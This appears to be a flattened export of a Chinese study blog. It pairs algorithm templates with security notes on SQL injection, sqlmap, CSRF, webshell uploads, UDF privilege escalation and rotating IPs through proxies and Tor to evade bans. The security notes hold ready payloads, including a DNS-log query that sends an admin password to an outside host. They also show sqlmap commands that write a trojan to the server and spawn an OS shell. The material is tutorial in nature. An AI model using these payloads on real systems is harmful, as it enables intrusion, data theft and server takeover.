原因是服务端在接收来自客户端的查询参数后，未对查询参数进行严格的过滤。导致恶意用户可在查询参数中插入恶意的sql语句来查询数据库中的敏感信息，最终造成数据库信息泄露。这也是安全防护的方法 关键点：我们输入的内容一定要是数据库语句。 我们输入的地方有哪些: 121.网站给我们提供的框框（比如搜索框）2.网址的参数的值的地方。 2.mysql常用语法mysql和sql server都是最常用的数据库语言，虽然语法不同但特别相似。其中mysql是开源的，sql server是微软开发的。 12345库：information_schema 是Mysql数据库里面一个自带的库的库名，存储着你所有的数据库名、表名和列名。表：schemata,tables，columns;schemata存库名，tables存放都是表名，columns都是列名列：table_name(存储的表名)， table_schema（存储的是库名），column_name（存储的是列名）limit m,n # 查询m+1行的n条数据。 m+1行开始查询多少条？如limit 0,1group_concat #多行数据用一行显示 大概的demo长这样： 3.其他类型判断注入漏洞 我们发现在这里url显示id=1但实际上id=’1’,多了引号，如果还像上面那样用and 1=2判断就会变成id=’1 and 1=2’，即输入的内容会被包括在引号里。我们想到在1后面加个引号，再加上and 1=2，此时会变成 此时只需注释掉最后一个引号即可。mysql的两种注释： 12-- abc #abc不会被识别，注意--后有空格，但打空格会被自动取消掉，可以打空格的unicode编码%20或+#abc #注意不能打#,要打#的unicode编码%23 4.get注入与post注入数据包的第一行的第一个是请求方式GET或POST 以上在URL中传递参数为GET注入在网址需要转换成unicode；如果是在网页的框内，为POST注入,应该不转换。万能密码：猜测源代码中有’要形成闭合，#意味注释掉后续代码，因为1=1为真，所以代码执行后为真，通过 123数字型判断：and 1=1 / and 1=2字符型判断：' and 1=1 -- '搜索型判断：and %' -- q id='%abc%' 怎么知道是什么类型的？暴力枚举–有类似万能密码字典的东西。 二、注入分类1.显错注入/联合注入（Mysql数据库）的基本流程123456789101112131415161718192021 1.判断网站是否存在数据库注入漏洞 and 1=1 网页有内容 and 1=2 网页没有内容 ==&gt; 这个网站存在数据库注入漏洞。原因：我们输入的数据库语句被网站代入到他的数据库中执行了。 2.判断字段（列）数， order by ，作用是排序。 order by 1 --&gt; 页面有内容，说明网站的那个表有1列 order by 2 --&gt; 页面有内容，说明网站的那个表有2列 order by 3 --&gt; 页面没有内容，说明网站的那个表没有3列，--&gt; 只有2列。3.查看回显点： union ，作用是联合查询，能够同时执行两条数据库查询语句。 注意：必须保证两条数据库查询语句查询的表的列数一致。这也是步骤2的必要性。回显点的作用：在该处输入的任何数据库语句，都会被直接执行，并且显示到页面上！如修改select 1,2中的2，页面内容发生变化，则第二列为回显点。4.查询相关内容 and 1=2 union select 1,2 and 1=2 union select 1,table_name from information_schema.tables where table_schema=database() limit 0,1 and 1=2 union select 1,column_name from information_schema.columns where table_schema=database() and table_name='zdafiilhhc' limit 0,1 and 1=2 union select 1,列名 from 表名 limit 0,1 用到的函数： 12version() ，# 作用 ：查询版本 ， 如5.5.53database() # 作用：查询当前数据库的库名 2.盲注(1)布尔注入盲注和显错注入的区别就是没有回显点。即我们要通过判断的方式，去查询相关数据内容用到的函数： 1234567length(database()) # 查询的是【当前数据库库名】的长度。length(database())=2 --&gt; 无查询数据 --&gt; 当前数据库的库名不是2个字符substr(字符串,m,n) # 函数，作用是截取。substr('cmd',1,1) # --&gt; 截取的是 c substr(database(),1,1) # 截取【当前数据库库名】的第一个字符。and substr(database(),1,1)='a' --&gt; 页面无内容--&gt; 说明当前数据库库名第一个字符不是a 1and substr((select table_name from information_schema.tables where table_schema = database() limit 0,1),1,1) = 'a' --&gt; 第一个字符不是a (2)时间注入以上均为布尔盲注，还有一种时间盲注，需用到sleep(),这个函数能让网页延迟显示 12and sleep(5) # 网站延时了5秒再显示。if(length(database())=12,sleep(5),1) --&gt; 网站延迟显示5秒，说明判断条件是对的--&gt;当前数据库库明的长度是12 可见，盲注很费时间。由此诞生了专门针对数据库注入漏洞的sqlmap工具。 3.cookie注入在Cookie处进行注入。 当你使用Cookie进行传参的时候 ，传参的值一定要进行URL编码的。默认浏览器是会URL编码的。 空格–&gt; %20 如果用的数据库是ACCESS，语法比较正规(select后一定要有from即要先找到一个表名)b9a2a2b5dffb918c -&gt; md5解码-&gt; welcome 12escape() # 函数，作用：进行URL编码document.cookie = &quot;id=&quot; + escape(&quot;171 and 1=2 union select 1,2,3,4,5,6,7,8,9,10 from admin&quot;) 4.head注入HEAD注入条件是知道用户名密码或登录状态 网络中web访问是以IP数据包形式传输数据，每个数据包由头部（head）和数据体（body）组成，head中有访问者的各种信息。 有的网站他会为了保存我们的信息作为比对会把head头中的信息保存到数据库中以便下一次使用。通讯时我们若能抓到请求数据包，并将头部中身份信息修改则为HEAD注入。抓包实例如下（使用burp） 就像图中User-Agent本意是表示你是哪种访问方式例如苹果、微软、安卓、华为等等，图中我把他的值更换为了一个注入语句，并报错就返回了我关心的结果。 12updataxml或extractvalue #报错函数 head注入是通过引起报错，来返回需要的信息，所以不需要回显点concat 下面详细讲解UPDATEXML (XML_document, XPath_string, new_value); 1234第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc第二个参数：XPath_string (Xpath格式的字符串)&lt;--有特定要求格式第三个参数：new_value，String格式，替换查找到的符合条件的数据作用：改变XML_document文档中符合XPATH_string的值 注入语句为 1updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1) 其中的concat()函数是将其连成一个字符串，因此不会符合XPATH_string的格式，从而出现格式错误，爆出错误ERROR 1105 (HY000): XPATH syntax error: '得到的数据' 5.报错注入任何能引起数据库报错的输入，如引号 123试下' and 1=1111,看报错信息'aandnd updatexml(1,concat(0x21,@@version,0x21),1)-- q#能让数据伴随报错一起显示0x21-&gt;!的编码 能让我们更快地识别出信息 6.DNS_LOG注入组合工具。利用DNS解析然后配合日志记录，将数据库里面的数据拿出来。 特点：能够将盲注变成显错注入。oob： out of bind 数据外带。 （1）什么是DNS把域名转换成IP地址的协议。域名-&gt;IP的外号 123域名 ip地址qq.com 12.34.56.78taobao.com 34.55.88.99 123a、网站搭建在服务器上b、服务器就是电脑c、访问网站的本质：浏览互联网上某台电脑上的某个文件 例如，修改host文件(本地DNS服务器)，我们输入完http://www.chenchan.com这个域名之后，咱们电脑会先访问host文件，就会将www.chenchan.com解析成192.168.189.128，然后访问这个IP。 （2）子域名和DNS日志记录DNS解析记录的日志网站,作用：可以申请一个域名，然后会记录下任何访问了这个域名和子域名的IP 12fefaad.dnslog.cn 都有记录。database.fefaad.dnslog.cn 也有记录 (3)注入方法关键函数： 123load_file() # 作用是：读文件concat() # 作用是 拼接字符串select load_file() #读取文件内容 命令： 12select load_file(concat(‘//’,(数据库语句),’.域名/1.txt’))select load_file(concat('//',(select password from admin limit 0,1),'.qtm0xb.dnslog.cn/1.txt')) 如图，发现没有回显点后，先输入and (),要执行括号里的语句:select load_file(concat(‘//’,(数据库语句),’.域名/1.txt’))注意一定要带一个文件，文件是什么无所谓，但loadfile是读取文件的，必须在mysql命令里写一个文件名上去。 三、BurpSuite什么是BurpSuite原理：中间人原理(如0元支付漏洞) 特点： 12所有模块可共享一个数据请求能测试网站所有的漏洞 安装和配置kali自带的是免费的社区版，功能有限，我们自己安装专业版 选择manual activation，然后无脑下一步 字体设置：user option -display 浏览器代理设置：burp依赖于浏览器代理。安装SwitchyOmega插件即可，该插件作用是智能化设置浏览器代理。 记得把插件设置成proxy模式 安装证书：burp默认只能访问http，要访问https的话需要安装CA证书。在burp的proxy模块–options–import/export CA–选择export的certificate in DER format–导出证书的位置(如桌面，保存为1.cer) 然后把证书导入到浏览器里，设置里搜索证书，导入1.cer即可 常用模块Target:容易探测越权类漏洞黑体代表访问过的站点，灰体代表没访问过但黑体站点包含的站点。scope可以设置查看网站的范围。 123通常配合spider(爬虫)、scanner(扫描web漏洞)模块使用。spider:将目标网站所有的网页让工具走一遍，然后配合filter找出有参数的页面scanner:AWVS,appscan,X-ray做的比burp好 proxy:burp的核心作用–抓数据包改包数据包分为请求数据包和响应数据包 12输入url,回车 --请求回车后，出现网页内容 --响应 浏览器拿到响应后渲染出页面 HTTP history可查看请求和响应option可改监听的端口(默认是8080，如果改成8081则浏览器也要改成8081)，还可以移除需要的验证(如javascript);显示隐藏内容;自动匹配与替换请求包的内容 repeater：手动探测漏洞比如proxy模块抓包后转发到repeater模块(体现了所有模块可共享数据请求)，可以直接查看响应内容。 intruder：爆破爆破是一种常见思想。 123position --设置爆破位置,默认会帮我们设，可以clear掉payloads --设置爆破字典option --可改爆破速度(number of threads,如50) 根据响应长度来判断(和大多数不一样) 宏：自动化设置数据 有验证码不能重复？配合其他工具使用 extender：安装插件CO2:与sqlmap结合，需配置sqlmap位置如下 jython.jar:让burp能使用python写的插件burpJSlinkFinder:能快速发现权限方面的漏洞，需pythonburpFaKeip:可以伪造ip和随机ip爆破 四、sqlmapSqlmap 是一个开源的渗透测试工具，可以自动检测和利用 SQL 注入缺陷以及接管数据库服务器的过程。 官网。注意：kali自带sqlmap工具。特点： 123全面支持各种常用的数据库语言全面支持六种SQL注入技术：布尔、时间、错误、联合、堆叠、oobsqlmap偏向于跑盲注 用法： 1234sqlmap -u &quot;url&quot; #kali用法sqlmap -u &quot;?id=1&amp;wd=123&quot; -p id,wd #指定测试的参数，默认测试所有参数 --逐参删除法，直到找到影响页面的参数，只能跟-usqlmap -r 1.txt #确定目标网站，1.txt存放burp抓到的请求包sqlmap -r 1.txt --data=&quot;wd=123,id=1&quot; #确定参数，可以跟-u和-r 当发现网站确实存在漏洞，就可以找数据了 12345678--dbs #查询所有数据库的库名-D 指定数据库--tables #查看所有的表-T 指定表名--columns #查询所有的列名-C 指定列名 如-D maoshe -T admin -C password --dump--dump ：查看数据(保存：-s “xx.log” 恢复:-s “xx.log” --resume) 进阶命令： 123456789--os-shell#执行系统命令,会让你选择目标网站服务器语言 sqlmap.py -u &quot;&quot; --os-shell --batch #默认选择 sqlmap.py -u &quot;&quot; --os-shell --batch--file-write=&quot;yjh_muma.php&quot; --file-dest=&quot;C:/phpStudy/WWW/502g58de/xiaoma.php&quot; #写文件到目标位置(木马)--proxy #使用代理去扫描目标 sqlmap.py -u &quot;&quot; --proxy=&quot;http://127.0.0.1:8080/&quot;（代理软件占用的端口在8087)--random-agent #使用随机的User-Agent头 绕过网站检测(默认user-agent会有sqlmap字段)--cookie #使用用户身份 sqlmap -u &quot;&quot; --cookie=&quot;cookie内容&quot;--level #提高扫描强度(默认不大)，扫描出漏洞可能性变大，但扫描时间会变长--risk #风险等级的设定 --level 3 --risk 2(经验值)--tamper：使用绕WAF的脚本 --tamper=&quot;tamper/between.py,tamper/randomcase.py&quot; 总结学习了sql注入的原理和sqlmap的使用方法。 问题1.sqlmap 连接超时12345看注入的目标地址是不是 https 协议，如果是可以使用sqlmap直接加上–force-ssl参数，告诉sqlmap这是https服务。或者可以在Host头后面加上:443（默认不是443）。ip 被封，需要开启代理，时刻切换ip，避免封ip梯子：智能模式访问国内网站仍用正常ip，全局梯子则是所有网站都会改变ip 参考资料1.sqlmap中文文档 2.靶场跑不了爆破临时解决办法 3.代理和VPN有什么区别","link":"/2022/04/10/sql%E6%B3%A8%E5%85%A5%E5%92%8Csqlmap/"},{"title":"acwing 1.基础算法","text":"摘要：acwing算法基础课学习笔记 零、如何学123主要思想 &lt;-- 上课理解并背过代码模板 &lt;--快速默写并调试通过题目 &lt;--提高熟练度(写完删掉重写一遍，重复3-5遍) 一、基础算法（一）排序快速排序 –基于分治123确定分界点x：q(l),q(r),q((l+r)/2),随机调整区间：保证左边的数&lt;=x,右边&gt;=x递归处理左右两边 难点是如何调整区间 1234#暴力做法开两个数组a[],b[]遍历q[l~r],若&lt;=x,插到a;若&gt;x，插到ba[]-&gt;q[],b[]-&gt;q[] 1234567#优美做法(双指针)创建两个指针L,R(也可用序号表示)L一直向右移，直到找到一个&gt;x的数，停下R一直向左移，直到找到一个&lt;=x的数，停下#此时L指向的数应放到右边，R指向的数应放到左边swap L，R对应的数，此时L指向的就是&lt;=x的，R指向的是&gt;=x的重复直至L,R相遇 怎么判断递归的序号起止？ 1234j停留的位置一定不满足&gt;x,即q[j]&lt;=xi停留的位置一定不满足&lt;x,即q[i]&gt;=xsort(q,l,j) //sort(q,l,i-1)sort(q,j+1,r) //sort(q,i,r) 注意边界问题： 12345若递归选择i，则分界点不能是q[l];j同理不能是q[r]中间点q[(l+r+1)/2]是万能的,建议选中点，也不容易超时如样例：n=2,q=[1,2]第一次递归时i=j=0,sort(q,0,-1),sort(q,0,1);会无限循环sort(q,0,1) 快排模板如下： 12345678910111213void quick_sort(int q[], int l, int r){ if (l &gt;= r) return; int i = l - 1, j = r + 1, x = q[l + r &gt;&gt; 1]; while (i &lt; j) { do i ++ ; while (q[i] &lt; x); do j -- ; while (q[j] &gt; x); if (i &lt; j) swap(q[i], q[j]); } quick_sort(q, l, j), quick_sort(q, j + 1, r);} 注意：分界点不一定=x 变形：第k个数 k每次更新成新区间第k小的数，所以每次新区间要重新编号 时间复杂度O(2n) 归并排序 –分治快排是先排后递归，归并是先递归再排 123确定分界点：mid = (l+r)/2递归排序left,right把两个有序的数组合成一个(难点) &lt;--双指针 (合并链表也是同样的原理) 如果两个值相同，一般是把第一个序列的指针往后移动一位（归并排序是稳定的） 归并模板如下： 123456789101112131415161718void merge_sort(int q[], int l, int r){ if (l &gt;= r) return; int mid = l + r &gt;&gt; 1; merge_sort(q, l, mid); merge_sort(q, mid + 1, r); int k = 0, i = l, j = mid + 1; while (i &lt;= mid &amp;&amp; j &lt;= r) if (q[i] &lt;= q[j]) tmp[k ++ ] = q[i ++ ]; else tmp[k ++ ] = q[j ++ ]; while (i &lt;= mid) tmp[k ++ ] = q[i ++ ]; while (j &lt;= r) tmp[k ++ ] = q[j ++ ]; for (i = l, j = 0; i &lt;= r; i ++, j ++ ) q[i] = tmp[j];} 二分整数二分只要看到有序序列，一定想到二分，或先排序后二分。每次保证更新的闭区间里一定有答案。 为什么第一种模板mid有一个+1？ 如果mid=(l+r)/2，如果某次划分的二分区间是[l,r]且l=r-1，则mid=下取整(l+r)/2=l,若check判断为true的话，则更新的区间仍为[l,r],即无限循环 12mid=l+r&gt;&gt;1check(mid) 模板如下 123456789101112131415161718192021222324bool check(int x) {/* ... */} // 检查x是否满足某种性质// 区间[l, r]被划分成[l, mid]和[mid + 1, r]时使用：int bsearch_1(int l, int r){ while (l &lt; r) { int mid = l + r &gt;&gt; 1; if (check(mid)) r = mid; // check()判断mid是否满足性质 else l = mid + 1; } return l;}// 区间[l, r]被划分成[l, mid - 1]和[mid, r]时使用：int bsearch_2(int l, int r){ while (l &lt; r) { int mid = l + r + 1 &gt;&gt; 1; if (check(mid)) l = mid; else r = mid - 1; } return l;} 二分法一定有解，题目可能无解，无解时，返回值的含义是第一个满足条件的。 浮点数二分保留六位小数 1r-l&gt;=1e-8 //经验值是保留的位数+2，若不满足要求可进一步提高精度 注意浮点数一定是严格按照[l,mid],[mid,r]来分的因为没有mid+1或mid-1，所以mid=(l+r)/2，不必再考虑+1的问题 浮点数模板如下： 12345678910111213bool check(double x) {/* ... */} // 检查x是否满足某种性质double bsearch_3(double l, double r){ const double eps = 1e-6; // eps 表示精度，取决于题目对精度的要求 while (r - l &gt; eps) { double mid = (l + r) / 2; if (check(mid)) r = mid; else l = mid; } return l;} 二、基础算法（二）1.高精度(1)高精度加法四种类型： 1234A+B len(A)&lt;=1e7A-B A*a a&lt;=1e10A/a 大整数的存储：低位在数组左边，高位在数组末尾原因；加法进位要补位数，在数组末尾补比数组头部补容易(要整个数组往后移动一位)模板： 123456789101112131415161718// C = A + B, A &gt;= 0, B &gt;= 0vector&lt;int&gt; add(vector&lt;int&gt; &amp;A, vector&lt;int&gt; &amp;B){ if (A.size() &lt; B.size()) return add(B, A); vector&lt;int&gt; C; int t = 0; for (int i = 0; i &lt; A.size(); i ++ ) { t += A[i]; if (i &lt; B.size()) t += B[i]; C.push_back(t % 10); t /= 10; } if (t) C.push_back(t); return C;} (2)高精度减法 模板： 12345678910111213141516// C = A - B, 满足A &gt;= B, A &gt;= 0, B &gt;= 0vector&lt;int&gt; sub(vector&lt;int&gt; &amp;A, vector&lt;int&gt; &amp;B){ vector&lt;int&gt; C; for (int i = 0, t = 0; i &lt; A.size(); i ++ ) { t = A[i] - t; if (i &lt; B.size()) t -= B[i]; C.push_back((t + 10) % 10); if (t &lt; 0) t = 1; else t = 0; } while (C.size() &gt; 1 &amp;&amp; C.back() == 0) C.pop_back(); return C;} (3)高精度乘法到下一位时，权重少10倍 模板： 123456789101112131415161718// C = A * b, A &gt;= 0, b &gt;= 0vector&lt;int&gt; mul(vector&lt;int&gt; &amp;A, int b){ vector&lt;int&gt; C; int t = 0; for (int i = 0; i &lt; A.size() || t; i ++ ) { if (i &lt; A.size()) t += A[i] * b; C.push_back(t % 10); t /= 10; } while (C.size() &gt; 1 &amp;&amp; C.back() == 0) C.pop_back(); return C;} (4)高精度除法 模板： 123456789101112131415// A / b = C ... r, A &gt;= 0, b &gt; 0vector&lt;int&gt; div(vector&lt;int&gt; &amp;A, int b, int &amp;r){ vector&lt;int&gt; C; r = 0; for (int i = A.size() - 1; i &gt;= 0; i -- ) { r = r * 10 + A[i]; C.push_back(r / b); r %= b; } reverse(C.begin(), C.end()); while (C.size() &gt; 1 &amp;&amp; C.back() == 0) C.pop_back(); return C;} 2、前缀和数组(1)一维定义$S_N = a_1+a_2+…+a_N,S_0=0$,如果已经算出来了S,则[l,r]区间的a数组和为$S_r-S_{l-1}$,时间复杂度为O(1)模板： 12345678910111213const int N =1e6+10;int a[N],S[N];int n,m,l,r;int main(){ scanf(&quot;%d%d&quot;,&amp;n,&amp;m); for(int i = 1;i&lt;=n;i++)scanf(&quot;%d&quot;,&amp;a[i]); for(int i = 1;i&lt;=n;i++)S[i]=S[i-1]+a[i]; while(m--){ scanf(&quot;%d%d&quot;,&amp;l,&amp;r); printf(&quot;%d\\n&quot;,S[r]-S[l-1]); } return 0;} (2)二维3.差分(1)一维差分是前缀的逆运算 构造：初始化${a_n},{b_n}$为0，看做n次插入，每次插入$a_n$,插入时可看做[n,n]区间加上$c = a_n$,所以不需要考虑构造的问题。即先构造${b_n}$,再根据${b_n}$写出${a_n}$ 复杂度：每次+c从O(n)–&gt;O(1) (2)二维a[i][j]存放差分数组b[i][j]所有左上角的和 $b_{x1,y1}+=c,则该点所有右下角的a都会+c$ 总结这节课学了排序(包括快排、归并)和二分(整数、浮点数)的模板 参考资料： 1.acwing","link":"/2022/04/14/acwing%201.%E5%9F%BA%E7%A1%80%E7%AE%97%E6%B3%95/"},{"title":"CSRF漏洞","text":"摘要：本文介绍了CSRF漏洞的定义和攻击方法 前言 一.什么是CSRFCSRF(Cross-site request forgery,跨站请求伪造),是一种挟制用户在当前【已登录】的 【Web 应用程序】上执行【非本意】的操作 的攻击方法。即目标修改了攻击者的修改 123XSS的攻击，是利用用户对网站的信任。CSRF攻击：利用网站对用户的信任。xsrf = xss + csrf 123正常网站A，我们有一个转账的操作，危险网站B，它能够利用我们的cookie去完成转账的操作，前提：我们必须访问这个危险网站B。例如：攻击者，保存了【提交公告】的操作，受害者登录了后台，同时也访问了另外一个危险网站，这个危险网站会利用POC和cookie执行【提交公告】这个操作 注意,目标先访问A，后访问B；且保存的这个操作必须是同个网站的，比如说想让管理员创建一个用户，但是普通用户是访问不了创建用户的界面的，无法生成POC，就不能这样攻击。且不是所有网站都有CSRF 我们通过一些技术手段欺骗受害者的浏览器去访问一个登录过的网站并执行一些操 作。由于浏览器曾经认证过，所以被访问的网站 会认为是真正的用户操作而去执行。 二、csrf 验证步骤(比如用扫描器扫描到了CSRF漏洞)1234step1:注册两个账号（临时邮箱，接码平台）如：test-1 和 test-2step2：test-2 修改信息，抓包，生成poc(burp)step3:test-2退出账号，登录test-1。test-1访问生成的poc 三、CSRF自点击技巧12id='a'是干啥呀 # 相当于给form取了个名字setTimeout() # 定时器，每隔多少执行一个操作 四、生成方法burp记录这个操作的时候，都是HTML语言 —&gt; 是CSRF攻击的一种生成方法 现在生成csrf攻击的另外一种——JS语言 总结 参考资料","link":"/2022/04/18/CSRF%E6%BC%8F%E6%B4%9E/"},{"title":"sql注入控制目标服务器","text":"摘要：本文完成了sql注入控制目标服务器的实战项目 前言实战项目：用sql注入控制目标服务器 一.必备知识sql注入 sql注入与trojan12select ··· into outfile ···· # 将查询的内容写入数据库的文件(可新增)Eg：select 'woaini Eleven' into outfile 'c:/WWW/AAAAA.txt' waf:会过滤and、or、=等关键词,如双写绕WAFand --&gt; aandnd 二、实战思路12345678910111213141516171819201.判断网站的应用方向电商类：业务逻辑漏洞，主要针对网站一些功能点门户类：信息泄露出来的漏洞，综合类的论坛类：站点层的漏洞2.了解网站技术架构java、中间件...3.CMS识别有的话--&gt; 找漏洞复现没有的话 --&gt; 黑盒测试（信息收集+漏洞种类）细节：(burp-repeater快速看response)不改变验证码情况下，网站依然对我们输入的密码做出了判断 --验证码可重复利用漏洞 --&gt;任意用户注册在任何平台提交漏洞，看的不是种类，而是漏洞危害信息收集， 你找到了1个站，你掌握了5个漏洞，你有机会测试5个地方。 你找到了n个站，你掌握了5个漏洞，你有机会测试n*5个地方。信息收集 --&gt; 扩大攻击面漏洞种类 --&gt; 扩大攻击点敏感文件是什么？源码、压缩包、密码文件、 总结 参考资料","link":"/2022/04/17/sql%E6%B3%A8%E5%85%A5%E6%8E%A7%E5%88%B6%E7%9B%AE%E6%A0%87%E6%9C%8D%E5%8A%A1%E5%99%A8/"},{"title":"sqlmap与ip黑名单绕过","text":"摘要：本文提出了两种sqlmap绕过ip黑名单的方法。分别是基于github上的ProxyPool项目搭建自己的免费代理池，和基于tor实现ip实时变化。 前言做靶场的sql注入时因访问频率过高被禁ip,就想实现一个不停变换ip的sqlmap。一开始想到用代理，结果在配置时踩了无数坑，且免费代理的效果和安全性也不太好，转而用tor。 一、基于proxypool搭建代理池1.安装和配置必要依赖(1)redis服务Redis是由C语言编写的开源、基于内存、支持多种数据结构、高性能的Key-Value数据库。 安装redis 123456wget https://download.redis.io/releases/redis-6.2.6.tar.gz //2022.4 最新tar xzf redis-6.2.6.tar.gzmv redis-6.2.6 /usr/local/rediscd /usr/local/redismakemake install PREFIX=/usr/local/redis 安装完成的提示 启动redis 1234567vim /bin/redis.conf //需在redis安装目录执行,将该配置文件中的daemonize no改为daemonize yes,来redis以后台方式运行./bin/redis-server redis.confps -ef | grep redis//查看redis进程./bin/redis-cliset test helloget test//测试exit (2)proxypoolgithub上的15k stars项目proxypool，主要功能为定时采集网上发布的免费代理验证入库，定时验证入库的代理保证代理的可用性，提供API和CLI两种使用方式。 1234567git clone https://github.com/jhao104/proxy_pool.gitpip install -r requirements.txt更新配置setting.py(主要是改API的PORT和数据库)。如：PORT = 5010 # 监听端口DB_CONN = 'redis://:pwd@127.0.0.1:8888/0'python proxyPool.py schedule # 启动调度程序python proxyPool.py server # 启动webApi服务 执行proxypool项目的调度程序和webApi服务程序(调度程序执行到base.py就可退出，但webApi需一直执行才能访问api网站)，然后访问setting里的127.0.0.1:PORT,(PORT为setting中设置的值，如默认的5010)，然后会提示访问不同文件的功能，如访问http://127.0.0.1:5010/get是获得一个代理地址。如下 如图，我们发现它的响应有很多属性，甚至还保留了属性名，而要使用sqlmap的–proxy代理功能需要网站只返回一个代理的地址实现方法是把127.0.0.1:5010/all里的所有代理ip采集下来并存在ips.txt中,再转发至127.0.0.1的一个端口IPSPORT，然后设置代理=127.0.0.1:IPSPORT 把/all里的ip采集到ips.txt并通过亚马逊ip验证 123456789101112131415161718192021import requestsdef get_proxy(): return requests.get(&quot;http://127.0.0.1:5010/all&quot;).json()res = requests.get(&quot;http://127.0.0.1:5010/count&quot;).json()count = res[&quot;count&quot;][&quot;total&quot;]print(&quot;目前代理池中共计：%s个代理.&quot; % count)f = open(&quot;ips.txt&quot;, &quot;w&quot;)ipall = get_proxy()#注意不能在for里面用这个函数，否则会list越界(count变化)for i in range(count): b = ipall[i][&quot;proxy&quot;] try: requests.get('http://checkip.amazonaws.com/', proxies={&quot;http&quot;: &quot;http://{}&quot;.format(b)},timeout=0.5)#需要快速响应的ip print(i) f.write(b + &quot;\\n&quot;) except Exception: passf.close() autoproxy需修改下except，代理为http://127.0.0.1:50007。只要ip池足够大，连接失败会自动切换可用ip 12345print(a) except Exception: local_server.close() logger.debug('Stop mapping service.') break 二、基于tor实现sqlmap或浏览器ip实时变化1.基于tor browser(1)安装tor browser安装tor browser解压包，进入解压后的目录 tor-browser_en-US 中打开 Browser 文件夹，找到 start-tor-browser 文件，编辑文件，将图中的0改为1，然后保存，目的是能用root用户使用tor(tor不推荐用root权限使用) 然后退出 Browser 文件夹选择 start-tor-browser.desktop 点击运行会出现如下界面，在配置中输入梯子的HTTP地址和端口 连接 Tor 服务器成功,即可使用 (2)配置proxychainkali自带proxychain4,可配置tor代理命令的地址和端口 先查看 Tor 在主机上的服务端口，如图默认是9150(注意保持tor浏览器打开) locate proxychains.conf查找 proxychains.conf位置,修改 proxychains.conf 文件,然后用proxychains curl ipconfig.me测试是否代理成功 (3)修改tor browser配置tor浏览器除了第一次访问某网站会分配给你一个和主机不同的ip，好像是默认10分钟换一次ip的。不能满足我们sqlmap的需求，可以在Browser/TorBrowser/Data/Tor/修改torrc配置文件，只需加上一行 1MaxCircuitDirtiness 1 可以改成每1分钟换一次ip 2.基于tor和ipchanger(1)安装dockerDocker 是一个开源的应用容器引擎，让开发者可以打包他们的应用以及依赖包到一个可移植的镜像中，然后发布到任何流行的 Linux或Windows操作系统的机器上，也可以实现虚拟化。容器是完全使用沙箱机制，相互之间不会有任何接口 12345678curl -fsSL https://download.docker.com/linux/debian/gpg | sudo apt-key add -echo 'deb https://download.docker.com/linux/debian stretch stable'&gt; /etc/apt/sources.list.d/docker.listapt-get install apt-transport-https ca-certificates curl gnupg2 software-properties-commonapt-get update sudo apt install docker.io #安装dockerdocker -v #检查是否安装成功apt install docker-compose #安装docker compose输入docker-compose,显示可用命令，则安装成功 (2)安装tor终端输入tor按照提示下载即可，下载完再次输入tor，显示正在建立链接(需梯子)，其默认端口为9050(查看方法同上)。 如果要配置tor代理的话同上，不配置也可用SOCKS5代理直接用 (3)安装ipchangeripchanger通过使用 TOR服务端每隔10秒请求一次新身份，可实现10秒换1次ip Linux只能用docker安装，安装方法 1234567把整个项目下载下来,解压到ipchanger文件夹进入Dockerfile同级目录docker build . -t ipchangerxhost +docker run -p 14999:14999 -p 9050:9050 -e DISPLAY=$DISPLAY -v /tmp/.X11-unix:/tmp/.X11-unix ipchanger然后就先start tor server(可以不开tor，但要梯)start IP change 默认代理端口为9150，可通过proxychain查看tor服务获得 三、sqlmap绕过ip黑名单用sqlmap扫描目标网址总是被封，该怎么利用以上方法呢？ 123sqlmap -u &quot;&quot; –-proxy= http://127.0.0.1:5000sqlmap -u &quot;&quot; --proxy= socks5://127.0.0.1:9150sqlmap -u &quot;&quot; --tor -tor-type=SOCKS5 使用之前先检测一下代理是否会变化 遇到的问题OSError: [Errno 98] Address already in use 错误是指端口被占用，未释放或者程序没有正常结束 12lsof -i:端口号 #可通过端口号来查找进程IDkill -9 pid #pid是指进程的ID号 ，kill -9 用来强制杀死进程 总结免费代理还是比较少的，而且匿名性也不好，有条件还是得用付费代理。 参考资料 Linux上安装Redis教程 ProxyPool文档 SqlMap代理池 Sqlmap自动切换代理 luminati代理快速使用教程 如何配置 Tor 代理池以及实现Sqlmap渗透注入防封IP测试 kali安装docker（亲测有效） dockerfile菜鸟教程 sqlmap笔记","link":"/2022/04/16/sqlmap%E4%B8%8Eip%E9%BB%91%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87/"},{"title":"trojan控制服务器","text":"摘要：本文介绍了trojan,和常用的trojan工具 一.必备知识文件上传漏洞：用户通过上传trojan文件，获得了管理网站/服务器的权限关键点：网站必须提供上传功能，知道trojan上传路径，trojan能被执行trojan:伪装成正常程序的恶意程序，一旦运行可以控制电脑网页trojan:伪装成正常网页的恶意网页(如x.php)，一旦运行可以控制网站或服务器webshell:一个文件，后缀名是asp,php,aspx等，功能是管理网站小马：功能少，代码量小的trojan大马：功能多，代码量大的trojan通信过程： 123451.输入网址2.浏览器把网址发送给DNS服务器并解析出ip3.浏览器拿到ip后，向那个ip服务器发起HTTP协议4.服务器会得到浏览器请求，并做出响应5.浏览器拿到响应，生成页面 二、制作图片trojan一般网站都不允许上传asp,php,aspx等后缀的文件，所以我们要改成图片的格式 1copy 原有图片.jpg/b + trojan.asp 要新生成的图片马.jpg 中间件(Nginx,Apache,Tomcat,IIS)：提供网站服务，并能解析webshell IIS6.0漏洞:后缀名为cer,cdx,asa的文件，统一解析成asp。比如上传了1.cer，最后执行的名字是1.asp。所以把图片马的后缀改成cer Apache解析php,Tomcat解析java 为什么不直接把ASP文件后缀名改成cer：每个文件都是有特征的 如何收集网站的中间件信息：Wappalyzer插件 三、找路径四、管理webshell管理webshell的工具：菜刀、蚁剑、冰蝎、格斯兰(kali默认安装了weevely,在命令行执行即可) 五、提权123456通常我们在拥有一个webshell的时候，一般权限都是WEB容器权限(即中间件权限network service)。因为我们上传木马是被中间件解析的，所以通过木马控制服务器现在的权限是中间件的权限。中间件的权限是网站管理员设置的。如在iis就是iis用户组权限，在apache 就是管理员权限，e一般都是权限较低，均可执行一些普通命令，如查看当前用户，网络信息，ip信息等。如果我想进行内网渗透就必须将权限提权到最高，如系统权限 超级管理员权限。更高的权限方便我们在后续的渗透中，扩大范围测试。 sqlmap中的os-shell也是同样原理，sql-shell 是数据库权限。 UDF提权UDF(User Defined Function用户自定义函数)。用户可以通过自定义函数实现在mysql中无法方便实现的功能，添加的新函数都可以在sql语句中调用，就像调用本机函数一样 udf.dll(windows)/udf.so(linux)是一个函数的脚本，这个脚本的作用是 提供了 mysql执行系统命令的功能。 条件： 